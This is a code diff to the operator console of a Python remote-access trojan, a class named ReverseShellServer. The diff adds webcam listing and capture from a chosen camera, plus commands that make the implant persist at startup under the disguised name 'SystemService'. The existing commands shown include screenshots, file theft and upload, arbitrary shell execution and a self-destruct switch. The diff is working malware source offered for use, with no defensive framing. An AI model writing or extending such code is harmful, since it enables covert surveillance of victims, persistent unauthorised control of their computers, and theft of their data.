@@ -252,6 +252,25 @@ class ReverseShellServer:
         else:
             print("  No established connections found")
 
+    def display_camera_list(self, cameras):
+        print("\n" + "="*50)
+        print("AVAILABLE CAMERAS")
+        print("="*50)
+        print(f"{'Index':<8} {'Resolution':<20} {'FPS':<10} {'Status':<15}")
+        print("-" * 55)
+        
+        for cam in cameras:
+            print(f"{cam['index']:<8} {cam['resolution']:<20} {cam['fps']:<10} {cam['status']:<15}")
+
+    def display_startup_status(self, startup_status):
+        print("\n" + "="*50)
+        print("STARTUP STATUS")
+        print("="*50)
+        
+        for key, value in startup_status.items():
+            status = "ENABLED" if value else "DISABLED"
+            print(f"  {key}: {status}")
+
     def handle_upload_command(self, client_sock, command):
         try:
             parts = command.split(' ', 2)
@@ -286,17 +305,21 @@ class ReverseShellServer:
         print("\n" + "="*50)
         print("AVAILABLE COMMANDS")
         print("="*50)
-        print("info         - System information")
-        print("screenshot   - Take screenshot")
-        print("cam          - Take photo from camera")
-        print("processes    - List running processes")
-        print("network      - Network information")
-        print("download <path> - Download file from target")
+        print("info              - System information")
+        print("screenshot        - Take screenshot")
+        print("list_cam          - List available cameras")
+        print("cam [index]       - Take photo from camera (default: 0)")
+        print("processes         - List running processes")
+        print("network           - Network information")
+        print("download <path>   - Download file from target")
         print("upload <local_file> [remote_path] - Upload file to target")
-        print("kill_switch  - Self-destruct trojan")
-        print("<command>    - Execute shell command")
-        print("exit/quit    - Exit shell")
-        print("help         - Show this help")
+        print("startup           - Add to startup")
+        print("startup_remove    - Remove from startup")
+        print("startup_status    - Check startup status")
+        print("kill_switch       - Self-destruct trojan")
+        print("<command>         - Execute shell command")
+        print("exit/quit         - Exit shell")
+        print("help              - Show this help")
 
     def handle_client_command(self, client_sock, client_addr, command):
         if command.lower() in ['exit', 'quit']:
@@ -313,8 +336,22 @@ class ReverseShellServer:
         elif command.lower() == 'screenshot':
             self.send_encrypted(client_sock, {"type": "screenshot"})
             
-        elif command.lower() == 'cam':
-            self.send_encrypted(client_sock, {"type": "cam"})
+        elif command.lower() == 'list_cam':
+            self.send_encrypted(client_sock, {"type": "list_cam"})
+            
+        elif command.lower().startswith('cam'):
+            # Проверяем, указан ли индекс камеры
+            parts = command.split()
+            if len(parts) > 1:
+                try:
+                    camera_index = int(parts[1])
+                except ValueError:
+                    print("[-] Invalid camera index. Using default (0)")
+                    camera_index = 0
+            else:
+                camera_index = 0
+            
+            self.send_encrypted(client_sock, {"type": "cam", "camera_index": camera_index})
             
         elif command.lower() == 'processes':
             self.send_encrypted(client_sock, {"type": "processes"})
@@ -328,6 +365,15 @@ class ReverseShellServer:
             
         elif command.lower().startswith('upload '):
             return self.handle_upload_command(client_sock, command)
+        
+        elif command.lower() == 'startup':
+            self.send_encrypted(client_sock, {"type": "add_to_startup", "startup_name": "SystemService"})
+        
+        elif command.lower() == 'startup_remove':
+            self.send_encrypted(client_sock, {"type": "remove_from_startup", "startup_name": "SystemService"})
+        
+        elif command.lower() == 'startup_status':
+            self.send_encrypted(client_sock, {"type": "check_startup", "startup_name": "SystemService"})
         
         elif command.lower() == 'kill_switch':
             self.send_encrypted(client_sock, {"type": "kill_switch"})
@@ -360,10 +406,18 @@ class ReverseShellServer:
             elif "camera_result" in response:
                 result = response["camera_result"]
                 if "camera_photo" in result:
-                    message = self.save_image(result["camera_photo"], "camera", client_addr)
-                    print(f"[+] {message}")
+                    camera_index = result.get("camera_index", "unknown")
+                    resolution = result.get("resolution", "unknown")
+                    message = self.save_image(result["camera_photo"], f"cam{camera_index}", client_addr)
+                    print(f"[+] Camera {camera_index} ({resolution}): {message}")
                 elif "error" in result:
                     print(f"[-] Camera error: {result['error']}")
+            elif "camera_list" in response:
+                result = response["camera_list"]
+                if "cameras" in result:
+                    self.display_camera_list(result["cameras"])
+                elif "error" in result:
+                    print(f"[-] Camera list error: {result['error']}")
             elif "process_list" in response:
                 result = response["process_list"]
                 if "processes" in result:
@@ -389,6 +443,20 @@ class ReverseShellServer:
                     print(f"[+] {result['message']}")
                 elif "error" in result:
                     print(f"[-] Upload error: {result['error']}")
+            elif "startup_result" in response:
+                result = response["startup_result"]
+                if "success" in result:
+                    print(f"[+] {result['message']}")
+                    if "user_startup" in result:
+                        print(f"    User startup: {'✓' if result['user_startup'] else '✗'}")
+                    if "system_startup" in result:
+                        print(f"    System startup: {'✓' if result['system_startup'] else '✗'}")
+                elif "error" in result:
+                    print(f"[-] Startup error: {result['error']}")
+                else:
+                    print(f"[*] {result.get('message', 'Operation completed')}")
+            elif "startup_status" in response:
+                self.display_startup_status(response["startup_status"])
             elif "killed" in response:
                 print(f"[+] {response['killed']}\n")
                 return False
